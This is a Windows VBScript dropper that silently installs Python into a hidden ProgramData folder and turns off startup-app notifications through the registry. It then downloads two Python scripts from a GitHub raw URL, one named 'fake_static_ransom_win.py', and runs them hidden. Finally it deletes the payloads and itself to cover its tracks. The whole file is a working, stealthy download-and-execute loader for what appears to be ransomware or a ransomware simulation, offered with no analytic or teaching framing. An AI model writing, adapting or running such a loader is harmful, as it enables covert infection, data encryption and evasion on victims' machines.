' Suppress all error popups (script will run silently in background)
On Error Resume Next

Dim objShell, fso, tempDir, configDir, pythonInstaller, pythonPath, pythonExe
Dim downloadCmd, installCmd, folderObj, folderrObj, pythonUrl, regKey

Set objShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

If objShell Is Nothing Or fso Is Nothing Then WScript.Quit

' Define paths
tempDir = objShell.ExpandEnvironmentStrings("%WINDIR%") & "\Temp"
configDir = tempDir & "\.tmp"
pythonInstaller = configDir & "\python-installer.exe"
pythonPath = "C:\ProgramData\Python"
pythonExe = pythonPath & "\python.exe"
pythonUrl = "https://www.python.org/ftp/python/3.15.2//python-3.15.2-amd64.exe"
regKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.StartupApp\"

' 1. Create hidden directories
If Not fso.FolderExists(configDir) Then
    fso.CreateFolder(configDir)
End If
If fso.FolderExists(configDir) Then
    Set folderObj = fso.GetFolder(configDir)
    folderObj.Attributes = folderObj.Attributes Or 2 ' 2 = Hidden
End If

If Not fso.FolderExists(pythonPath) Then
    fso.CreateFolder(pythonPath)
End If
If fso.FolderExists(pythonPath) Then
    Set folderrObj = fso.GetFolder(pythonPath)
    folderrObj.Attributes = folderrObj.Attributes Or 2 ' 2 = Hidden
End If

objShell.RegWrite regKey & "Enabled", 0, "REG_DWORD"

' 2. Check if Python is already installed, if not, download and install silently
If Not fso.FileExists(pythonExe) Then
    downloadCmd = "curl.exe -sL -o " & Chr(34) & pythonInstaller & Chr(34) & " " & Chr(34) & pythonUrl & Chr(34)
    objShell.Run downloadCmd, 0, True

    If fso.FileExists(pythonInstaller) Then
        installCmd = Chr(34) & pythonInstaller & Chr(34) & _
            " /quiet InstallAllUsers=0 TargetDir=" & Chr(34) & pythonPath & Chr(34) & _
            " PrependPath=1 Include_test=0 Include_doc=1 Include_tcltk=1 Include_pip=1" & _
            " Include_dev=1 Include_tools=1 Include_exe=1 Include_lib=1"
        objShell.Run installCmd, 0, True
        WScript.Sleep 10000
        fso.DeleteFile pythonInstaller, True
        ' --- NEW: Add Python to user PATH so CMD and PowerShell both find it ---
        Dim pathCmd
        pathCmd = "cmd /c setx PATH ""%PATH%;" & pythonPath & ";" & pythonPath & "\Scripts"" >nul 2>&1"
        objShell.Run pathCmd, 0, True
        ' ----------------------------------------------------------------------
    End If
End If


' 3. Download the Python files
Dim url1, url2, path1, path2
url1 = "https://raw.githubusercontent.com/rahul-call/inner/main/ror/fake_static_ransom_win.py"
url2 = "https://raw.githubusercontent.com/rahul-call/inner/main/ror/auto.py"
path1 = configDir & "\fake_static_ransom_win.py"
path2 = configDir & "\auto.py"

objShell.Run "cmd /c curl -sL -o """ & path1 & """ """ & url1 & """", 0, True
objShell.Run "cmd /c curl -sL -o """ & path2 & """ """ & url2 & """", 0, True

' 4. Execute Python silently
' Run python.exe with the args, setting the working directory to configDir
Dim args
args = "auto.py fake_static_ransom_win.py "
runCmd = "cmd /c cd /d """ & configDir & """ && """ & pythonExe & """ " & args
objShell.Run runCmd, 0, False


' delete downloaded files
WScript.Sleep 10000  ' give Python a moment to load the .py files
If fso.FileExists(path1) Then fso.DeleteFile path1, True
If fso.FileExists(path2) Then fso.DeleteFile path2, True

' Permanently delete this script itself (delayed, so the file is no longer locked)
objShell.Run "cmd /c timeout /t 2 /nobreak >nul & del /f /q """ & WScript.ScriptFullName & """", 0, False


